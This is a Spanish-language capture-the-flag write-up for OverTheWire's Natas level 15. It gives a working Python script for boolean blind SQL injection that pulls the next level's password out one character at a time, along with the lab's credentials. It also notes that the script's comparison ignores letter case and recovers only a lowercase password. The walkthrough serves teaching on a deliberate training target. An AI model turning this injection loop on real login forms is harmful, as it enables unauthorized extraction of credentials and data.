# Natas Level15

## Descripción
> **Level Goal (natas15.natas.labs.overthewire.org):** Un formulario solo dice si un usuario "existe" o "no existe" en la base de datos, construyendo la consulta `SELECT * from users where username="..."` con el valor recibido sin escapar.

## Solución
Es una inyección SQL a ciegas (blind SQL injection) booleana: no hay ningún dato visible en la respuesta salvo un true/false ("existe" / "no existe"), pero eso es suficiente para reconstruir cualquier dato bit a bit usando condiciones que dependan de él. Se inyecta una condición sobre la tabla `users` de la propia base de datos, probando carácter por carácter de la contraseña de `natas16` con `SUBSTRING(password, posición, 1) = "letra"`.

```python
import requests

auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
url = "http://natas15.natas.labs.overthewire.org/index.php"

def exists(payload):
    r = requests.post(url, auth=auth, data={"username": payload})
    return "This user exists" in r.text

password = ""
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for pos in range(1, 33):
    for c in charset:
        payload = f'natas16" AND SUBSTRING(password,{pos},1)="{c}'
        if exists(payload):
            password += c
            break

print(password)
# xm6xeern3zsgjrdqbpmuqavv65k7e3gb
```

## Notas adicionales
- El nombre de tabla/columna (`users`, `username`, `password`) se conoce por el comentario `CREATE TABLE` incluido en el propio código fuente del nivel.
- 32 posiciones × hasta 62 candidatos por posición ≈ un puñado de segundos con `requests` en Python — mucho más rápido que hacerlo con `curl` en un bucle de shell.
- Blind SQLi booleana es más lenta que una inyección con salida directa, pero funciona igual: cualquier oráculo verdadero/falso controlado por una consulta SQL vulnerable permite extraer datos arbitrarios de la base.
- **Importante (detectado al intentar usar la contraseña extraída en el nivel 16):** la comparación de cadenas en MySQL usa por defecto una *collation* insensible a mayúsculas/minúsculas (`utf8_general_ci` o similar). Eso significa que `SUBSTRING(password,N,1)="a"` da verdadero tanto si el carácter real es `a` como `A`. La extracción de este writeup con `=` a secas solo recupera el password en minúsculas; para el valor exacto (el que exige el HTTP Basic Auth, que sí distingue mayúsculas) hay que forzar comparación binaria con `BINARY SUBSTRING(password,N,1)="c"`. Ver el writeup de [level16](../level16/README.md) para el detalle de cómo se resolvió esto en la práctica.

## Referencias
- Reto original: http://natas15.natas.labs.overthewire.org/
- Apoyo: https://owasp.org/www-community/attacks/Blind_SQL_Injection (OWASP, Blind SQL Injection)
